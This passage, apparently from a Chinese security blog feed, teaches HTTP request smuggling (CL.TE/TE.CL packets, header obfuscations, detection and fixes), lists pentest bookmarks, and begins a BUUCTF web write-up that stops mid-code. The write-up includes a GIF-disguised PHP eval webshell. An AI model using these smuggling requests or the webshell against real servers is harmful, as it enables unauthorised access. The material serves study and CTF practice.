&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;figcaption&gt;&lt;span&gt;数据包&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;POST / HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host: vulnerable-website.com&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Length: 13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Transfer-Encoding: chunked&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SMUGGLED&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;数据同时使用两种方法指定消息长度&lt;/p&gt;
&lt;p&gt;🎀前服务器处理 Content-Length 头，认为请求主体为 13 字节，刚好至 smuggled 末尾，再将消息转发至后端服务器&lt;/p&gt;
&lt;p&gt;🎀后服务器处理 Transfer-Encoding 头，由上述 Transfer-Encoding 知识点可知，这是一个终止块，那么接下来的 smuggled 不会被处理，后端服务器会将 smuggled 拼接至下一个请求的开始&lt;/p&gt;
&lt;h3 id=&#34;tecl&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#tecl&#34;&gt;#&lt;/a&gt; &lt;a href=&#34;http://TE.CL&#34;&gt;TE.CL&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;类似 CL.TE&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;figcaption&gt;&lt;span&gt;数据包&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;POST / HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host: vulnerable-website.com&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Length: 3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Transfer-Encoding: chunked&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SMUGGLED&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;（⭐burp 上方 repeater 选项取消 Update Content-Length，这个选项会根据实体长度自动更新 Content-Length 头）&lt;/p&gt;
&lt;p&gt;🎀前服务器处理 Transfer-Encoding 头，第一块 8 个字节，第二块为终止块，请求终止，请求转发至后端服务器&lt;/p&gt;
&lt;p&gt;🎀后服务器处理 Content-Length 头，实体长度为 3，那么从 S 开始的内容，都将被视为序列中下一个请求的开始&lt;/p&gt;
&lt;h3 id=&#34;tete&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#tete&#34;&gt;#&lt;/a&gt; TE.TE&lt;/h3&gt;
&lt;p&gt;混淆 Transfer-Encoding 头的方式很多，例如&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Transfer-Encoding: xchunked&lt;/li&gt;
&lt;li&gt;Transfer-Encoding : chunked&lt;/li&gt;
&lt;li&gt;Transfer-Encoding: chunked&lt;br&gt;
Transfer-Encoding: x&lt;/li&gt;
&lt;li&gt;Transfer-Encoding:[tab]chunked&lt;/li&gt;
&lt;li&gt;[space]Transfer-Encoding: chunked&lt;/li&gt;
&lt;li&gt;X: X[\n]Transfer-Encoding: chunked&lt;/li&gt;
&lt;li&gt;
&lt;dl&gt;
&lt;dt&gt;Transfer-Encoding&lt;/dt&gt;
&lt;dd&gt;chunked&lt;/dd&gt;
&lt;/dl&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;检测http请求走私&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#检测http请求走私&#34;&gt;#&lt;/a&gt; 检测 HTTP 请求走私&lt;/h1&gt;
&lt;p&gt;实时站点，流量较大，可能将我们的 payload 拼接至别的用户数据包中&lt;/p&gt;
&lt;p&gt;以下列出一种几乎没有影响其他用户风险的检测手段&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;figcaption&gt;&lt;span&gt;数据包&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;POST /smuggled HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;HOST: example.com&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Transfer-Encoding: chunked&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Length: 4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Z&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Q&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;clet-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#clet-2&#34;&gt;#&lt;/a&gt; &lt;a href=&#34;http://CL.ET&#34;&gt;CL.ET&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;前端检测实体长度为 4 个字节，Q 不会被转发，后端没有接受到终止块，会一直等待至超时，此时会有明显的延迟效果&lt;/p&gt;
&lt;h2 id=&#34;clcl&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#clcl&#34;&gt;#&lt;/a&gt; &lt;a href=&#34;http://CL.CL&#34;&gt;CL.CL&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;会被两个系统无害处理&lt;/p&gt;
&lt;h2 id=&#34;tecl-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#tecl-2&#34;&gt;#&lt;/a&gt; &lt;a href=&#34;http://TE.CL&#34;&gt;TE.CL&lt;/a&gt;&amp;amp;TE.TE&lt;/h2&gt;
&lt;p&gt;由于无效的大小块 Q，前端将拒绝该消息，不会将其转发至后端&lt;/p&gt;
&lt;p&gt;那么怎么区分以上两个呢，且看下面这个数据包&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;figcaption&gt;&lt;span&gt;数据包&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;POST /smuggled HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;HOST: example.com&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Transfer-Encoding: chunked&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Length: 9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;X&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;为 TE.CL 模式时，前端接收终止块，转发 X（不包括 X）以前的内容至后端服务器，共 7 个字节。后端服务器处理 Content-Length 头，认为实体为 9 个字节（&amp;gt;7），此时也会出现明显延迟&lt;/p&gt;
&lt;p&gt;为 TE.TE 时，正确的终止块格式，会被系统无害处理&lt;/p&gt;
&lt;p&gt;⭐burp 商店中也可以找到 HTTP Request Smuggler 模块，可以 scan 出来后，右键 Smuggle attack&lt;/p&gt;
&lt;p&gt;⭐工具：&lt;a href=&#34;https://github.com/defparam/smuggler&#34;&gt;https://github.com/defparam/smuggler&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;修复http请求走私&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#修复http请求走私&#34;&gt;#&lt;/a&gt; 修复 HTTP 请求走私&lt;/h1&gt;
&lt;h2 id=&#34;我-不-理-解&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#我-不-理-解&#34;&gt;#&lt;/a&gt; 我 不 理 解&lt;/h2&gt;
&lt;p&gt;在前端服务器通过同一网络连接将多个请求转发到后端服务器的情况下，会出现 HTTP 请求走私漏洞，并且后端连接所使用的协议有可能会造成边界不统一的风险。防止 HTTP 请求走私漏洞的一些通用方法如下：&lt;/p&gt;
&lt;p&gt;1. 禁用后端连接的重用，以便每个后端请求通过单独的网络连接发送。&lt;/p&gt;
&lt;p&gt;2. 使用 HTTP / 2 进行后端连接，因为此协议可防止对请求之间的边界产生歧义。&lt;/p&gt;
&lt;p&gt;3. 前端服务器和后端服务器使用完全相同的 Web 服务器软件，以便它们就请求之间的界限达成一致。&lt;/p&gt;
&lt;h1 id=&#34;传送门&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#传送门&#34;&gt;#&lt;/a&gt; 传送门&lt;/h1&gt;
&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/request-smuggling&#34;&gt;PortSwigger_HTTP request smuggling&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.freebuf.com/column/221488.html&#34;&gt;HTTP 走私漏洞分析&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://mp.weixin.qq.com/s?__biz=MzAwMzYxNzc1OA==&amp;amp;mid=2247486547&amp;amp;idx=1&amp;amp;sn=de1f1390b6526eb2e45a0e05c4fd444d&amp;amp;chksm=9b392ae2ac4ea3f4fbc01e19a9494a2d8fec4b20fae5e93041cfc6f874f7eebff14d5420c499&amp;amp;mpshare=1&amp;amp;scene=23&amp;amp;srcid=0824Nx28uGiuA86YDMRjhkR0&amp;amp;sharer_sharetime=1598277825562&amp;amp;sharer_shareid=ff83fe2fe7db7fcd8a1fcbc183d841c4#rd&#34;&gt;由一次渗透测试引发的 HTTP 请求走私思考 (牛的)&lt;/a&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2021/07/05/%E6%94%B6%E8%97%8F%E5%A4%B9%E5%96%94/</guid>
            <title>收藏夹喔</title>
            <link>http://example.com/2021/07/05/%E6%94%B6%E8%97%8F%E5%A4%B9%E5%96%94/</link>
            <pubDate>Mon, 05 Jul 2021 11:25:08 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;&lt;ins class=&#34;wavy&#34;&gt;&lt;span class=&#34;rainbow&#34;&gt;好多值得再看的文章系列 o (￣ε￣*)&lt;/span&gt;&lt;/ins&gt;&lt;/p&gt;
&lt;details class=&#34;danger&#34;&gt;&lt;summary&gt;内网相关&lt;/summary&gt;&lt;div&gt;
&lt;div class=&#34;note info&#34;&gt;
&lt;p&gt;内网就。随缘学&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&#34;tab&#34; data-id=&#34;id3&#34; data-title=&#34;内网基础&#34;&gt;
&lt;p&gt;content&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.4hou.com/posts/Jlo9&#34;&gt;盘点 RUNDLL32.EXE 的多种滥用方式及检测特征 - 41yf1sh&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.cnblogs.com/ssooking/articles/6171247.html&#34;&gt;CHM 渗透：从入门到 “入狱” - ssooking - 博客园&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://mp.weixin.qq.com/s/KfeKpoPj-X7BRNR7O6QAcw&#34;&gt;Linux 计划任务那些事&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;div class=&#34;tab&#34; data-id=&#34;id3&#34; data-title=&#34;新思路&#34;&gt;
&lt;p&gt;content&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://mp.weixin.qq.com/s/ERJMCgb61dykT5rhQtYgMw&#34;&gt;内网渗透｜基于文件传输的 RDP 反向攻击&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/details&gt;
&lt;details class=&#34;primary&#34;&gt;&lt;summary&gt;java相关&lt;/summary&gt;&lt;div&gt;
&lt;div class=&#34;note info&#34;&gt;
&lt;p&gt;代码审计要好好学喔&lt;/p&gt;
&lt;p&gt;最重要的是 P 神的知识星球真的超赞🌟，知识星球搜代码审计就能搜到&lt;/p&gt;
&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://xie.infoq.cn/article/9a9387805a496e1485dc8430f&#34;&gt;java 代理详解&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;&lt;/details&gt;
&lt;details class=&#34;info&#34;&gt;&lt;summary&gt;工具&lt;/summary&gt;&lt;div&gt;
&lt;div class=&#34;note info&#34;&gt;
&lt;p&gt;用来记录工具链接&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/No-Github/1earn/blob/master/1earn/Security/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/BurpSuite.md&#34;&gt;burp 使用小技巧&lt;/a&gt;&lt;/p&gt;
&lt;/div&gt;&lt;/details&gt;
&lt;details class=&#34;warning&#34;&gt;&lt;summary&gt;渗透测试&lt;/summary&gt;&lt;div&gt;
&lt;div class=&#34;note info&#34;&gt;
&lt;p&gt;渗透测试相关&lt;/p&gt;
&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://mp.weixin.qq.com/s/WAtkMzdOdbOD_9k98JRYBg&#34;&gt;WAF 绕过&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://xz.aliyun.com/t/10043#toc-7&#34;&gt;文件上传绕过思路拓展&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://mp.weixin.qq.com/s/rAcctU4XArY8SZYwkOAYjA&#34;&gt;XSS 大王&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;&lt;/details&gt;
&lt;p&gt;testtest&lt;/p&gt;
&lt;h1 id=&#34;一号标题&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#一号标题&#34;&gt;#&lt;/a&gt; 一号标题&lt;/h1&gt;
&lt;h2 id=&#34;二号&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#二号&#34;&gt;#&lt;/a&gt; 二号&lt;/h2&gt;
&lt;h3 id=&#34;三号&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#三号&#34;&gt;#&lt;/a&gt; 三号&lt;/h3&gt;
&lt;h4 id=&#34;四号&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#四号&#34;&gt;#&lt;/a&gt; 四号&lt;/h4&gt;
&lt;h5 id=&#34;五号&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#五号&#34;&gt;#&lt;/a&gt; 五号&lt;/h5&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2021/06/29/buuctf-web/</guid>
            <title>Buuctf-web 武林秘籍</title>
            <link>http://example.com/2021/06/29/buuctf-web/</link>
            <pubDate>Tue, 29 Jun 2021 11:30:13 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;极客大挑战2019-upload&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#极客大挑战2019-upload&#34;&gt;#&lt;/a&gt; 极客大挑战 2019 upload&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;关键词：php，phtml，过滤 &amp;lt;?，文件上传&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;根据 Content-Type 判断图片：Content-Type: image/png&lt;/p&gt;
&lt;p&gt;过滤’&amp;lt;?’，传 phtml 一句话木马&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;GIF89a&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script language=&amp;quot;php&amp;quot;&amp;gt;eval($_POST[&amp;#x27;shell&amp;#x27;]);&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;phtml 简单来说就是将 php 嵌入 html 中&lt;/p&gt;
&lt;p&gt;(这题很诡异的是我上传一个正常图片，回显 Not Image)&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;极客大挑战2019-php&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#极客大挑战2019-php&#34;&gt;#&lt;/a&gt; 极客大挑战 2019 php&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;关键词：php 反序列化，网站备份，php 代码审计&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;🎀网站备份文件名猜测，嫌麻烦直接上目录扫描，为 www.zip&lt;/p&gt;
&lt;p&gt;www.zip 中包含的文件主要为 index.php，class.php，flag.php&lt;/p&gt;
&lt;p&gt;🎀index.php 中关键代码片段如下：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;class.php&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$select&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;select&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$res&lt;/span&gt;=unserialize(@&lt;span class=&#34;variable&#34;&gt;$select&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;从 get 请求中获取’select’的值，再将该变量反序列化（其中变量前加 @是为了防止报错信息输出，导致信息泄露）&lt;/p&gt;
&lt;p&gt;🎀class.php 中 Name 对象：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;flag.php&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;error_reporting(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;Name&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$username&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;nonono&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$password&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;yesyes&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__construct&lt;/span&gt;(&lt;span 